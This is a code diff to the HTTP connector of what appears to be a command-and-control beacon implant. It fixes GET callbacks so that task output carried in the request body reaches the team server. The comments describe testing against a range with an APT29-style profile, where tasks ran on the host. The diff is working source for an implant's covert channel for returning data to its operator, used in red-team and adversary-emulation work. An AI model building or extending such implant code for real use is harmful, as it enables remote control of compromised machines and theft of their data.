@@ -246,58 +246,133 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 						}
 					}
 
-					// Build request headers with optional Host header
+					// Build request headers with optional Host header + optional
+					// explicit Content-Length header.
+					//
+					// Why Content-Length is manual here: WinINet's HttpSendRequestA
+					// takes (data, data_size) and will emit a request body for ANY
+					// http verb when data_size > 0. For POST it adds a
+					// Content-Length header automatically, but for GET it does not —
+					// RFC 7230 §3.3.2 lets a GET carry a payload body only when the
+					// representation is identified by headers, so WinINet treats a
+					// GET body as "optional/entity-of-no-meaning" and omits the
+					// framing header. Any HTTP/1.1-conforming proxy then has to
+					// treat the request as having no body (there is no
+					// Transfer-Encoding either) and the downstream origin reads
+					// bodyData==[] regardless of what the beacon sent.
+					//
+					// This matters because the beacon's output-return path
+					// (MainAgent.cpp:62-70) encodes task results into the request
+					// body of the NEXT beacon callback — for a listener profile
+					// configured with http_method:GET the callback is a GET-with-
+					// body, and without an explicit Content-Length the body never
+					// reaches the team server. Observed live 2026-10-23 on a
+					// range running the APT29 BeaconHTTP profile (http_method:
+					// GET): beacon registered + heartbeated fine, tasks were
+					// delivered in response bodies and ran on-host (Sysmon
+					// confirmed child-process spawns), but every GET callback
+					// afterwards carried only headers — nginx front-ended
+					// `rangejson` log consistently reported `body_bytes=<empty>`
+					// across 500+ callbacks, and TsTaskListCompleted stayed
+					// empty on the server side. Setting Content-Length
+					// manually here lets both nginx and the team server read the
+					// body on the same code path a POST would use.
 					CHAR* reqHeaders = this->headers;
 					CHAR* tmpHeaders = NULL;
-					if (this->hh_count > 0) {
-						CHAR* currentHH = this->host_headers[this->hh_index];
-						ULONG hhLen = StrLenA(currentHH);
-						ULONG baseLen = StrLenA(this->headers);
-						WORD currentPort = this->server_ports[this->server_index];
-
-						BOOL hasPort = FALSE;
-						for (ULONG i = 0; i < hhLen; i++) {
-							if (currentHH[i] == ':') {
-								hasPort = TRUE;
-								break;
-							}
-						}
-
+					BOOL hasHostOverride = (this->hh_count > 0);
+					// Only when the verb carries a payload body that WinINet will
+					// NOT frame automatically. POST already gets Content-Length
+					// from WinINet; adding our own on POST produces a duplicate
+					// header some HTTP/1.1 origins reject (RFC 7230 §3.3.2 says
+					// Content-Length MUST NOT be sent twice with conflicting
+					// values). The problem WinINet creates is strictly on
+					// GET-with-body — that's the only path that needs this.
+					BOOL isPost = (this->http_method && this->http_method[0] == 'P');
+					BOOL needContentLength = (data && data_size > 0 && !isPost);
+					if (hasHostOverride || needContentLength) {
+						CHAR* currentHH = NULL;
+						ULONG hhLen = 0;
 						BOOL needPort = FALSE;
 						CHAR portStr[6] = {0};
 						ULONG portLen = 0;
-						if (!hasPort) {
-							if ((this->ssl && currentPort != 443) || (!this->ssl && currentPort != 80)) {
-								needPort = TRUE;
-								WORD port = currentPort;
-								if (port == 0) {
-									portStr[portLen++] = '0';
-								} else {
-									CHAR temp[6];
-									int tempIdx = 0;
-									while (port > 0) {
-										temp[tempIdx++] = '0' + (port % 10);
-										port /= 10;
-									}
-									for (int i = tempIdx - 1; i >= 0; i--) {
-										portStr[portLen++] = temp[i];
-									}
+						if (hasHostOverride) {
+							currentHH = this->host_headers[this->hh_index];
+							hhLen = StrLenA(currentHH);
+							WORD currentPort = this->server_ports[this->server_index];
+
+							BOOL hasPort = FALSE;
+							for (ULONG i = 0; i < hhLen; i++) {
+								if (currentHH[i] == ':') {
+									hasPort = TRUE;
+									break;
 								}
-								portStr[portLen] = 0;
+							}
+
+							if (!hasPort) {
+								if ((this->ssl && currentPort != 443) || (!this->ssl && currentPort != 80)) {
+									needPort = TRUE;
+									WORD port = currentPort;
+									if (port == 0) {
+										portStr[portLen++] = '0';
+									} else {
+										CHAR temp[6];
+										int tempIdx = 0;
+										while (port > 0) {
+											temp[tempIdx++] = '0' + (port % 10);
+											port /= 10;
+										}
+										for (int i = tempIdx - 1; i >= 0; i--) {
+											portStr[portLen++] = temp[i];
+										}
+									}
+									portStr[portLen] = 0;
+								}
 							}
 						}
 
-						ULONG allocSize = 6 + hhLen + (needPort ? 1 + portLen : 0) + 2 + baseLen + 1;
+						// Content-Length: DWORD max 4294967295 → 10 decimal digits + null.
+						CHAR clStr[11] = {0};
+						ULONG clLen = 0;
+						if (needContentLength) {
+							DWORD cl = data_size;
+							if (cl == 0) {
+								clStr[clLen++] = '0';
+							} else {
+								CHAR temp[11];
+								int tempIdx = 0;
+								while (cl > 0) {
+									temp[tempIdx++] = '0' + (cl % 10);
+									cl /= 10;
+								}
+								for (int i = tempIdx - 1; i >= 0; i--) {
+									clStr[clLen++] = temp[i];
+								}
+							}
+							clStr[clLen] = 0;
+						}
+
+						ULONG baseLen = StrLenA(this->headers);
+						ULONG hostLineLen = hasHostOverride ? (6 + hhLen + (needPort ? 1 + portLen : 0) + 2) : 0;
+						ULONG clLineLen   = needContentLength ? (16 + clLen + 2) : 0;
+						ULONG allocSize = hostLineLen + clLineLen + baseLen + 1;
 						tmpHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, allocSize);
 						ULONG off = 0;
-						tmpHeaders[off++] = 'H'; tmpHeaders[off++] = 'o'; tmpHeaders[off++] = 's';
-						tmpHeaders[off++] = 't'; tmpHeaders[off++] = ':'; tmpHeaders[off++] = ' ';
-						memcpy(tmpHeaders + off, currentHH, hhLen); off += hhLen;
-						if (needPort) {
-							tmpHeaders[off++] = ':';
-							memcpy(tmpHeaders + off, portStr, portLen); off += portLen;
+
+						if (hasHostOverride) {
+							tmpHeaders[off++] = 'H'; tmpHeaders[off++] = 'o'; tmpHeaders[off++] = 's';
+							tmpHeaders[off++] = 't'; tmpHeaders[off++] = ':'; tmpHeaders[off++] = ' ';
+							memcpy(tmpHeaders + off, currentHH, hhLen); off += hhLen;
+							if (needPort) {
+								tmpHeaders[off++] = ':';
+								memcpy(tmpHeaders + off, portStr, portLen); off += portLen;
+							}
+							tmpHeaders[off++] = '\r'; tmpHeaders[off++] = '\n';
 						}
-						tmpHeaders[off++] = '\r'; tmpHeaders[off++] = '\n';
+						if (needContentLength) {
+							memcpy(tmpHeaders + off, "Content-Length: ", 16); off += 16;
+							memcpy(tmpHeaders + off, clStr, clLen); off += clLen;
+							tmpHeaders[off++] = '\r'; tmpHeaders[off++] = '\n';
+						}
 						memcpy(tmpHeaders + off, this->headers, baseLen); off += baseLen;
 						tmpHeaders[off] = 0;
 						reqHeaders = tmpHeaders;
